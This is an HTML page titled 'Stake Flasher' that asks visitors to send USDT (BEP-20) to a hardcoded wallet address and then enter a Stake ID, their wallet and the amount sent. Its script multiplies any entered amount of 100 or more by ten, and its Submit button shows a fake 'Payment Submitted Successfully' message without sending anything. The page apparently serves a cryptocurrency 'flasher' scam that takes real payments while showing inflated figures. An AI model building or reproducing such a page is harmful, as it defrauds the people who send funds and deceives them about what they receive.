<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Stake Flasher</title>

<style>
* {
    box-sizing: border-box;
}

body {
    font-family: Arial, sans-serif;
    background-color: #0f172a;
    color: white;
    margin: 0;
    padding: 10px;
}

.container {
    width: 100%;
    max-width: 380px;
    margin: auto;
    background: #1e293b;
    padding: 15px;
    border-radius: 10px;
    text-align: center;
}

input, select, button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border-radius: 6px;
    border: none;
    font-size: 14px;
}

button {
    background-color: green;
    color: white;
    font-weight: bold;
}

img {
    width: 180px;
    height: auto;
    margin-top: 10px;
}

#address {
    font-size: 13px;
    word-break: break-all;
}
</style>
</head>

<body>

<div class="container">
    <h2>Stake Flasher</h2>
    <p>Select Cryptocurrency</p>

    <select disabled>
        <option>USDT (BEP-20)</option>
    </select>

    <img src="wallet_qr.png" alt="QR Code">

    <p id="address">
        0x24f551eae922e4a72b05f678626e86ee241461a0
    </p>

    <button onclick="copyAddress()">Copy Address</button>

    <input type="text" placeholder="Stake ID">
    <input type="text" placeholder="Your Wallet Address">

    <input type="number" id="amount" placeholder="Amount Sent (USD)">

    <input type="file">

    <button onclick="submitForm()">Submit</button>
</div>

<script>
// Copy
function copyAddress() {
    let address = document.getElementById("address").innerText;
    navigator.clipboard.writeText(address);
    alert("Address Copied!");
}

// FIXED multiply logic
document.addEventListener("DOMContentLoaded", function() {
    let amountInput = document.getElementById("amount");

    amountInput.addEventListener("blur", function() {
        let value = parseFloat(this.value);

        if (!isNaN(value) && value >= 100) {
            this.value = value * 10;
        }
    });
});

// Submit
function submitForm() {
    alert("Payment Submitted Successfully ✅");
}
</script>

</body>
</html>
